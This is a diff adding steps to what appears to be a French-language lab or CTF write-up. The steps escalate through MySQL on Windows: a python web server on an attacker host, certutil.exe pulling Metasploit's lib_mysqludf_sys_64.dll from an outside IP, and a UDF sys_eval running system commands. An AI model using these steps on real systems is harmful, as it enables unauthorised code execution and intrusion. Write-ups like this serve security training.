@@ -103,3 +103,20 @@ On vérifie les permissions du dossier plugin avec
 icacls.exe C:\MySQL\lib\plugin
 ```
 
+Ok on lance dans /usr/share/metasploit-framework/data/exploits/mysql un serveur web avec
+
+```bash
+python -m http.server
+```
+
+Puis dans le cmd on fait depuis le dossier plugin
+
+```cmd
+certutil.exe -urlcache -split -f http://10.10.16.218:8000/lib_mysqludf_sys_64.dll .
+```
+
+```sql
+CREATE FUNCTION sys_eval RETURNS STRING SONAME ‘lib_mysqludf_sys_64.dll’;
+SELECT sys_eval('whoami')
+```
+
